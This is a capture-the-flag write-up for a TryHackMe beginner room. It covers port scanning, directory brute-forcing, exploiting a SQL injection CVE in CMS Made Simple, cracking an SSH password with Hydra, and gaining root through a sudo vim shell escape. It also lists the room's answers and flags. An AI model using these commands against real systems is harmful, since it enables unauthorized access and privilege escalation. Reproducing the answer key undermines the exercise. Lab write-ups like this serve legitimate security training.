# [Simple CTF](https://tryhackme.com/room/easyctf)
Beginner level ctf.

## Task 1 - Simple CTF

### Question: How many services are running under port 1000?
* Run a network scan to discover any active services

```nmap -sV [IP address]```
```
Answer: 2
```
---
### Question: What is running on the higher port?
```
Answer: ssh
```
---
### Question: What's the CVE you're using against the application?
* Search for any directories

```gobuster dir -u 10.10.213.243 -w /usr/share/wordlists/rockyou.txt ```
* Found the directory ```/simple/``` that looks interesting
  * Looking around the page, we find the website running ```CMS Made Simple version 2.2.8```
  * Under News, it shows that a news module was installed
* Search for this in a CVE database
```
Answer: CVE-2019-9053
```
---
### Question: To what kind of vulnerability is the application vulnerable?
```
Answer: SQLi
```
---
### Question: What's the password?
* We can use the information about the CVE to find and download the appropriate exploit on ```exploit-db.com```
  * ```CMS Made Simple < 2.2.10 - SQL Injection``` 

```python -u [URL ADDRESS] -w /usr/share/wordlist/rockyou.txt```
* Tried running this command, but ran into issues
* Had to place parentheses around all print statements
* Program still fails, but after uncovering the following information:
  * Password Salt: ```1dac0d92e9fa6bb2```
  * Username: ```Mitch```
  * Email: ```admin@admin.com```
* We can use Hydra to attempt to crack the password

```hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.44.205:2222 -t 5```
* This reveals the password ```secret```
```
Answer: secret
```
---
### Question: Where can you login with the details obtained?
* From the network scan, we know there are three active services
* We used one of those ports for cracking the password we obtained
```
Answer: ssh
```
---
### Question: What's the user flag?
* Using the credentials we gathered, we can ssh into the network

```ssh mitch@10.10.44.205 -p2222```
```
Answer: G00d j0b, keep up!
```
---
### Question: Is there any other user in the home directory? What's its name?
* Climb up the current directory
```
Answer: sunbath
```
---
### What can you leverage to spawn a privileged shell?
* Running the command ```sudo -l``` gives us some information:

  ```(root) NOPASSWD: /usr/bin/vim```
```
Answer: vim
```
---
### Question: What's the root flag?
* Running a Google search to find an exploitation, we find this command:
  
```sudo vim -c '!sh'```
* After running the command, ```whoami``` reveals that we escalated privileges
* Navigate to the root directory
```
Answer: W3ll d0n3. You made it!
```